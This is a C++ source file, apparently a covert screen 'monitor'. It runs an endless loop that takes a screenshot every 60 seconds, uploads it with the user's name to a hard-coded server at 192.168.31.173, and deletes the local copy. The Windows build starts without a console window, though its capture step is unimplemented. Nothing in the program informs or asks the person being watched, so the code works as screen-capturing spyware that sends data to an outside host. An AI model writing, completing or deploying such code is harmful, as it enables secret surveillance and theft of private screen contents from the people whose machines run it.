#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <iomanip>  
#include <sstream>  
#include <curl/curl.h>

#ifdef _WIN32
    #include <windows.h>
    #include <lmcons.h>
#else
    #include <unistd.h>
    #include <pwd.h>
#endif

using namespace std;

string get_username() {
#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) return string(username);
    return "unknown_win";
#else
    struct passwd *pw = getpwuid(getuid());
    return pw ? pw->pw_gecos : "unknown_linux"; // pw_name ??
#endif
}

string get_timestamp() {
    auto now = chrono::system_clock::now();
    auto in_time_t = chrono::system_clock::to_time_t(now);
    stringstream ss;
    ss << put_time(localtime(&in_time_t), "%Y%m%d_%H%M%S");
    return ss.str();
}

string get_linux_screenshot_command(const string& filename) {
    const char* session_env = getenv("XDG_SESSION_TYPE");
    string session = (session_env) ? session_env : "x11"; 

    const char* desktop_env = getenv("XDG_CURRENT_DESKTOP");
    string desktop = (desktop_env) ? desktop_env : "";

    if (session == "wayland") {
        if (desktop.find("KDE") != string::npos) return "spectacle -b -n -o " + filename;
        if (desktop.find("GNOME") != string::npos) return "gnome-screenshot -f " + filename;
        return "grim " + filename;
    } 
    return "DISPLAY=:0 scrot -z " + filename;
}

// Функция отправки файла на сервер
void send_file(string filename, string user) {
    CURL *curl = curl_easy_init();
    if(curl) {
        curl_mime *form = curl_mime_init(curl);
        curl_mimepart *field = curl_mime_addpart(form);
        
        curl_mime_name(field, "file");
        curl_mime_filedata(field, filename.c_str());

        field = curl_mime_addpart(form);
        curl_mime_name(field, "user");
        curl_mime_data(field, user.c_str(), CURL_ZERO_TERMINATED);

        curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.31.173:5000/upload");
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            fprintf(stderr, "Ошибка отправки: %s\n", curl_easy_strerror(res));
        }
            
        curl_easy_cleanup(curl);
        curl_mime_free(form);
    }
}

void run_monitor() {
    curl_global_init(CURL_GLOBAL_ALL);
    string user = get_username();
    
    while (true) {
        string filename;
        string cmd;

#ifdef _WIN32
        // Для Windows используем папку Temp пользователя
        filename = "C:\\Windows\\Temp\\scr_" + get_timestamp() + ".png";
        cmd = ""; // GDI
#else
        filename = "/tmp/scr_" + get_timestamp() + ".png";
        cmd = get_linux_screenshot_command(filename);
#endif

        if (!cmd.empty() && system(cmd.c_str()) == 0) {
            send_file(filename, user);
            remove(filename.c_str()); 
        }
        
        this_thread::sleep_for(chrono::seconds(60));
    }
    curl_global_cleanup();
}

#ifdef _WIN32
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    run_monitor();
    return 0;
}
#else
int main() {
    run_monitor();
    return 0;
}
#endif
